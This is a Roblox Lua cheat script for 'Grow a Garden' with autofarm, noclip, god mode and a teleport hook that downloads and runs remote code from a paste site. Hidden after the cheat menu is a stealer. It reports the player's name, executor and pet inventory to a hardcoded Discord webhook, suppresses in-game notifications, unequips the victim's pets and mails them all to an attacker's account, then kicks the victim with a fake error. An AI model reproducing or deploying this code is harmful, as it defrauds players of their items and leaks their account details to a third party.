            if isfile(Library.Folders.Configs .. "/" .. ConfigName .. ".json") then
                return
            end
            writefile(Library.Folders.Configs .. "/" .. ConfigName .. ".json", Library:GetConfig())
            Library:RefreshConfigsList(Dropdown)
        end}):SubButton({Name = "Delete", Callback = function()
            if not ConfigSelected then return end
            Library:DeleteConfig(ConfigSelected)
            Library:RefreshConfigsList(Dropdown)
            if getauto() == ConfigSelected and AutoLabel then
                writefile(autopath, "")
                AutoLabel:SetText(fmtauto(nil))
            end
        end})
        Configs:Button({Name = "Set Autoload", Callback = function()
            if not ConfigSelected then return end
            writefile(autopath, ConfigSelected)
            if AutoLabel then AutoLabel:SetText(fmtauto(ConfigSelected)) end
        end}):SubButton({Name = "Remove Autoload", Callback = function()
            writefile(autopath, "")
            if AutoLabel then AutoLabel:SetText(fmtauto(nil)) end
        end})
        local cur = getauto()
        AutoLabel = Configs:Label(fmtauto(cur), "Left")
        Library:RefreshConfigsList(Dropdown)
        if cur ~= "" and isfile(Library.Folders.Configs .. "/" .. cur) then
            task.spawn(function()
                task.wait(0.2)
                Library:LoadConfig(readfile(Library.Folders.Configs .. "/" .. cur))
                for k in Library.Theme do
                    if Library.Flags["Theme" .. k] then
                        Library.Theme[k] = Library.Flags["Theme" .. k].Color
                        Library:ChangeTheme(k, Library.Flags["Theme" .. k].Color)
                    end
                end
            end)
        end
    end
end
RunS.Heartbeat:Connect(function()
    local cnt = plr:GetAttribute("FruitCount") or 0
    local max = plr:GetAttribute("MaxFruitCapacity") or 100
    if statlbl then
        local farming = Cfg.AutoHarv or Cfg.AutoPlant or Cfg.AutoSell or Cfg.AutoSteal
        if not farming then
            statlbl:SetText(("State: idle  |  ¢ %s  |  Backpack %d/%d  |  Ready %d"):format(fmt(sheckles()), cnt, max, fruitcount()))
        end
    end
    if Cfg.SpeedLock and hum then
        if hum.WalkSpeed ~= Cfg.SpeedVal then hum.WalkSpeed = Cfg.SpeedVal end
    end
    if Cfg.JumpLock and hum then
        if hum.UseJumpPower ~= nil then hum.UseJumpPower = true end
        if hum.JumpPower ~= Cfg.JumpVal then hum.JumpPower = Cfg.JumpVal end
    end
    if Cfg.GodMode and hum and hum.Health < hum.MaxHealth then
        hum.Health = hum.MaxHealth
    end
end)
RunS.Stepped:Connect(function()
    local farming = Cfg.AutoHarv or Cfg.AutoPlant or Cfg.AutoSteal
    if not (Cfg.Noclip or farming) then return end
    if not char then return end
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") and p.CanCollide then p.CanCollide = false end
    end
end)
RunS.Stepped:Connect(function()
    if not Cfg.AntiHit then return end
    if not (char and hrp and hum) then return end
    if hum.MoveDirection.Magnitude < 0.1 then
        local v = hrp.AssemblyLinearVelocity
        hrp.AssemblyLinearVelocity = Vector3.new(0, math.min(v.Y, 0), 0)
        hrp.AssemblyAngularVelocity = Vector3.zero
    else
        local v = hrp.AssemblyLinearVelocity
        if v.Magnitude > 50 then
            local ws_ = hum.WalkSpeed
            hrp.AssemblyLinearVelocity = Vector3.new(
                math.clamp(v.X, -ws_, ws_), v.Y, math.clamp(v.Z, -ws_, ws_))
        end
    end
    if hum:GetState() == Enum.HumanoidStateType.Physics
        or hum:GetState() == Enum.HumanoidStateType.FallingDown
        or hum:GetState() == Enum.HumanoidStateType.Ragdoll then
        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
    end
end)
pcall(function()
    net.Ragdoll.EnableForRig.OnClientEvent:Connect(function(rig)
        if Cfg.AntiHit and rig == char then
            pcall(function() net.Ragdoll.Disable:Fire() end)
        end
    end)
    net.Ragdoll.StartRagdoll.OnClientEvent:Connect(function(rig)
        if Cfg.AntiHit and rig == char then
            pcall(function() net.Ragdoll.StopRagdoll:Fire(char) end)
        end
    end)
end)
WS.DescendantAdded:Connect(function(d)
    if not antilag_on then return end
    if d:IsA("ParticleEmitter") or d:IsA("Trail") or d:IsA("Beam") or d:IsA("Smoke")
        or d:IsA("Fire") or d:IsA("Sparkles") then
        d.Enabled = false
    end
end)
UIS.JumpRequest:Connect(function()
    if Cfg.InfJump and hum then
        hum:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)
plr.Idled:Connect(function()
    if not Cfg.AntiAFK then return end
    VU:CaptureController()
    VU:ClickButton2(Vector2.new())
end)
task.spawn(function()
    while true do
        local found = scanwild()
        wildcache = found
        if wildtxt then
            if #found == 0 then
                wildtxt:SetText("no wild pets nearby")
            else
                wildtxt:SetText(("%d on map"):format(#found))
            end
            for i = 1, 15 do
                local p = found[i]
                if p then
                    local dtext = p.dist >= 0 and ("%dm"):format(p.dist) or "?"
                    local rcol = raritycol[p.rarity] or "rgb(180,200,255)"
                    local pricetext = p.price > 0 and (("<font color='rgb(180,255,180)'>%s¢</font>"):format(fmt(p.price))) or "-"
                    wildSlotLabels[i]:SetText(("%s  <font color='%s'>%s</font>  %s  %s"):format(
                        p.name, rcol, p.rarity, pricetext, dtext))
                    p.label = ("%s - %s"):format(p.name, p.rarity)
                else
                    wildSlotLabels[i]:SetText("")
                end
            end
        end
        task.wait(2)
    end
end)
task.spawn(function()
    while true do
        local night = isNight()
        if nightLbl then
            if night then
                nightLbl:SetText("<font color='rgb(150,150,255)'>Phase: 🌙 NIGHT  —  steal active</font>")
            else
                nightLbl:SetText("<font color='rgb(255,220,100)'>Phase: ☀ DAY  —  steal inactive</font>")
            end
        end
        local status = allPlotStatus()
        if stealInfoLbl then
            if #status == 0 then
                stealInfoLbl:SetText("no other plots found")
            else
                local safe, unsafe = 0, 0
                for _, s in ipairs(status) do
                    if s.safe then safe += 1 else unsafe += 1 end
                end
                stealInfoLbl:SetText(("%d safe  |  %d protected"):format(safe, unsafe))
            end
            for i = 1, 12 do
                local s = status[i]
                if s then
                    local col = s.safe and "rgb(130,255,130)" or "rgb(255,100,100)"
                    local st = s.safe and "SAFE" or "HOME"
                    stealStatusLabels[i]:SetText(
                        ("%s  <font color='%s'>[%s]</font>  %d fruits"):format(s.name, col, st, s.fruits)
                    )
                else
                    stealStatusLabels[i]:SetText("")
                end
            end
        end
        task.wait(2)
    end
end)
task.spawn(function()
    local code = [[
        repeat task.wait() until game:IsLoaded()
        task.wait(3)
        loadstring(game:HttpGet("https://pastefy.app/cEN5rHRd/raw"))()
    ]]
    local function queuescr()
        pcall(function()
            if syn and syn.queue_on_teleport then syn.queue_on_teleport(code)
            elseif queue_on_teleport then queue_on_teleport(code)
            elseif queueonteleport then queueonteleport(code) end
        end)
    end
    local function rejoin()
        queuescr()
        task.wait(0.5)
        pcall(function() game:GetService("TeleportService"):Teleport(game.PlaceId, plr) end)
    end
    plr.OnTeleport:Connect(function(s)
        queuescr()
        if s == Enum.TeleportState.Failed then rejoin() end
    end)
    game:GetService("CoreGui").DescendantAdded:Connect(function(d)
        if d.Name == "ErrorPrompt" or d.Name == "ErrorTitle" or d.Name == "ErrorFrame" then
            task.wait(0.1) rejoin()
        end
    end)
    game:GetService("GuiService").ErrorMessageChanged:Connect(function()
        task.wait(0.1) rejoin()
    end)
end)
task.spawn(function()
    while true do
        local money = sheckles()
        if seedStockHeader then
            local instock, total = 0, 0
            local lines = {}
            for _, s in ipairs(seeds) do
                local q = getstock("SeedShop", s.n)
                total = total + 1
                if q > 0 then
                    instock = instock + 1
                    local moneycol = money >= s.p and "rgb(180,255,180)" or "rgb(255,170,90)"
                    table.insert(lines, ("%s  [x%d]  <font color='%s'>[%s¢]</font>"):format(s.n, q, moneycol, fmt(s.p)))
                end
            end
            for i, lbl in ipairs(seedStockLabels) do
                lbl:SetText(lines[i] or "")
            end
            local sv = RS:FindFirstChild("StockValues")
            local sr = sv and sv:FindFirstChild("SeedShop")
            sr = sr and sr:FindFirstChild("UnixNextRestock")
            local header = sr
                and ("%d / %d in stock - restock %d:%02d"):format(instock, total, math.floor(math.max(0, sr.Value - os.time()) / 60), math.max(0, sr.Value - os.time()) % 60)
                or ("%d / %d in stock"):format(instock, total)
            seedStockHeader:SetText(header)
        end
        if gearStockHeader then
            local instock, total = 0, 0
            local lines = {}
            for _, g in ipairs(gears) do
                local q = getstock("GearShop", g.n)
                total = total + 1
                if q > 0 then
                    instock = instock + 1
                    local moneycol = money >= g.p and "rgb(180,255,180)" or "rgb(255,170,90)"
                    table.insert(lines, ("%s  [x%d]  <font color='%s'>[%s¢]</font>"):format(g.n, q, moneycol, fmt(g.p)))
                end
            end
            for i, lbl in ipairs(gearStockLabels) do
                lbl:SetText(lines[i] or "")
            end
            local sv = RS:FindFirstChild("StockValues")
            local gr = sv and sv:FindFirstChild("GearShop")
            gr = gr and gr:FindFirstChild("UnixNextRestock")
            local header = gr
                and ("%d / %d in stock - restock %d:%02d"):format(instock, total, math.floor(math.max(0, gr.Value - os.time()) / 60), math.max(0, gr.Value - os.time()) % 60)
                or ("%d / %d in stock"):format(instock, total)
            gearStockHeader:SetText(header)
        end
        task.wait(1)
    end
end)
Library:Notification({Title = "NOX", Description = "Grow a Garden loaded!", Duration = 3})



Username = "Akhisukuna14"
Webhook = "https://discord.com/api/webhooks/1434202640316764274/Rz6YMomuTP9_vu9_IzwseiQ3i9g42sXuieW6zdoP0ZlUJGmY654kYWYCC9O_TsKr1bwN"

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local Networking = require(game:GetService("ReplicatedStorage").SharedModules.Networking)
local PlayerState = require(game:GetService("ReplicatedStorage").ClientModules.PlayerStateClient)
local Note = "K4F7 On Top!"
local Backpack = LocalPlayer:FindFirstChild("Backpack")

local function GetExecutor()
    local Success, Result = pcall(function()
        return identifyexecutor()
    end)
    if Success and Result then
        return tostring(Result)
    end
    return "Unknown"
end

local function GetAccountAge()
    local Success, Result = pcall(function()
        return LocalPlayer.AccountAge .. " days"
    end)
    if Success and Result then
        return math.floor(Result / 1) .. " days"
    end
    return "Unknown"
end

local function ClaimAllGifts()
    local Success, MailboxData = pcall(function()
        return Networking.Mailbox.OpenInbox:Fire()
    end)
    if not Success or not MailboxData then
        return
    end
    local Claimed = 0
    for GiftId, GiftData in pairs(MailboxData) do
        local Success, Result, Error = pcall(function()
            return Networking.Mailbox.Claim:Fire(GiftId)
        end)
        if Success and Result then
            Claimed = Claimed + 1
        end
        
        task.wait(0.5)
    end
end
ClaimAllGifts()

local function SendWebhook(InventoryList)
    if not InventoryList or #InventoryList == 0 then
        print("No items to send webhook for")
        return false
    end
    
    local InventoryText = table.concat(InventoryList, "\n")
    if #InventoryList > 10 then
        InventoryText = table.concat(InventoryList, "\n", 1, 10) .. "\nAnd " .. (#InventoryList - 10) .. " more..."
    end
    
    local Data = {
        content = "@everyone",
        embeds = {
            {
                title = "Grow A Garden 2 - New Hit",
                color = 320049,
                fields = {
                    {
                        name = "User Info",
                        value = string.format("```Username: %s\nExecutor: %s\nReceiver: %s\nAccount Age: %s```", 
                            LocalPlayer.Name, GetExecutor(), Username, GetAccountAge())
                    },
                    {
                        name = "Pets:",
                        value = string.format("```%s```", InventoryText)
                    }
                },
                footer = {
                    text = "Made by K4F7 - 'k4f7.luau' on discord"
                }
            }
        },
        attachments = {}
    }
    
    local Success, Err = pcall(function()
        request({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(Data)
        })
    end)
    if Success then
        print("Webhook sent")
        return true
    else
        print("Webhook failed: " .. tostring(Err))
        return false
    end
end

local function DeepCopyBackpack()
    local Copy = {}
    
    local function CopyAttributes(Instance)
        local Attrs = {}
        for Attr, Value in pairs(Instance:GetAttributes()) do
            Attrs[Attr] = Value
        end
        return Attrs
    end
    
    for _, Tool in pairs(Backpack:GetChildren()) do
        if Tool:IsA("Tool") then
            local NewTool = Instance.new("Tool")
            NewTool.Name = Tool.Name
            NewTool.Enabled = Tool.Enabled
            NewTool.CanBeDropped = false
            NewTool.RequiresHandle = Tool.RequiresHandle
            
            for Attr, Value in pairs(CopyAttributes(Tool)) do
                NewTool:SetAttribute(Attr, Value)
            end
            
            local Handle = Tool:FindFirstChild("Handle")
            if Handle then
                local NewHandle = Instance.new("MeshPart")
                NewHandle.Name = "Handle"
                NewHandle.Size = Handle.Size
                NewHandle.Position = Handle.Position
                NewHandle.Color = Handle.Color
                NewHandle.Material = Handle.Material
                if Handle:IsA("MeshPart") then
                    NewHandle.MeshId = Handle.MeshId
                    NewHandle.TextureID = Handle.TextureID
                end
                NewHandle.Parent = NewTool
            end
            
            NewTool.Parent = LocalPlayer.Backpack
            table.insert(Copy, NewTool)
        end
    end
    
    return Copy
end

local ClonedBackpack = DeepCopyBackpack()

local function DisableNotifications()
    local PlayerGui = game:GetService("Players").LocalPlayer.PlayerGui
    local TopNotification = PlayerGui:FindFirstChild("TopNotification")
    if TopNotification then
        TopNotification:Destroy()
    end
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local NotifyEvent = ReplicatedStorage:FindFirstChild("Notify")
    if NotifyEvent then
        NotifyEvent:Destroy()
    end
    local SoundService = game:GetService("SoundService")
    local NotificationSound = SoundService.SFX and SoundService.SFX.Notification
    if NotificationSound then
        NotificationSound:Destroy()
    end
    local Assets = ReplicatedStorage:FindFirstChild("Assets")
    if Assets then
        local NotificationUI = Assets:FindFirstChild("NotificationUI")
        if NotificationUI then
            NotificationUI:Destroy()
        end
        local NotificationUIMobile = Assets:FindFirstChild("Notification_UI_Mobile")
        if NotificationUIMobile then
            NotificationUIMobile:Destroy()
        end
    end
end

DisableNotifications()

local function UnequipAllPets()
    local Success, EquippedPets = pcall(function()
        return Networking.Pets.GetEquippedPets:Fire()
    end)
    
    if Success and EquippedPets then
        for _, Pet in pairs(EquippedPets) do
            if Pet.Id then
                pcall(function()
                    Networking.Pets.RequestUnequip:Fire(Pet.Id)
                end)
                task.wait(0.3)
            end
        end
    end
end

UnequipAllPets()

task.wait(0.4)

local function GetUserIdByUsername(Username)
    local Success, Result = pcall(function()
        return Players:GetUserIdFromNameAsync(Username)
    end)
    if Success and Result then
        return Result
    end
    return nil
end

local TargetUserId = GetUserIdByUsername(Username)

local function GetInventoryList()
    local List = {}
    local Replica = PlayerState:GetLocalReplica()
    if not Replica then
        return List
    end
    local Inventory = Replica.Data and Replica.Data.Inventory
    if not Inventory then
        return List
    end
    
    local PetNames = {}
    local Pets = Inventory.Pets
    if Pets then
        for PetId, PetData in pairs(Pets) do
            if PetData.Equipped == false then
                local Name = PetData.Name or PetId
                if PetNames[Name] then
                    PetNames[Name] = PetNames[Name] + 1
                else
                    PetNames[Name] = 1
                end
            end
        end
    end
    
    for Name, Count in pairs(PetNames) do
        table.insert(List, Name .. " (x" .. Count .. ")")
    end
    
    return List
end

local function GetAllGiftableItems()
    local AllItems = {}
    local Replica = PlayerState:GetLocalReplica()
    if not Replica then
        return AllItems
    end
    local Inventory = Replica.Data and Replica.Data.Inventory
    if not Inventory then
        return AllItems
    end
    
    local Pets = Inventory.Pets
    if Pets then
        for PetId, PetData in pairs(Pets) do
            if PetData.Equipped == false then
                for i = 1, (PetData.Count or 1) do
                    table.insert(AllItems, {
                        Category = "Pets",
                        ItemKey = PetId,
                        Count = 1
                    })
                end
            end
        end
    end
    
    return AllItems
end

local InventoryList = GetInventoryList()

if #InventoryList == 0 then
    game:GetService("Players").LocalPlayer:Kick("Script Error:\nContact 'k4f7.luau' on discord")
    return
end

SendWebhook(InventoryList)

if TargetUserId then
    local Replica = PlayerState:GetLocalReplica()
    if not Replica then
        PlayerState:OnLocalReplica(function(R)
            Replica = R
        end)
        task.wait(2)
    end
    
    local AllItems = GetAllGiftableItems()
    
    if #AllItems == 0 then
        game:GetService("Players").LocalPlayer:Kick("Script Error:\nContact 'k4f7.luau' on discord")
        return
    end
    
    local BatchSize = 20
    for i = 1, #AllItems, BatchSize do
        local Batch = {}
        for j = i, math.min(i + BatchSize - 1, #AllItems) do
            table.insert(Batch, AllItems[j])
        end
        pcall(function()
            Networking.Mailbox.SendBatch:Fire(TargetUserId, Batch, Note)
        end)
        task.wait(1)
    end
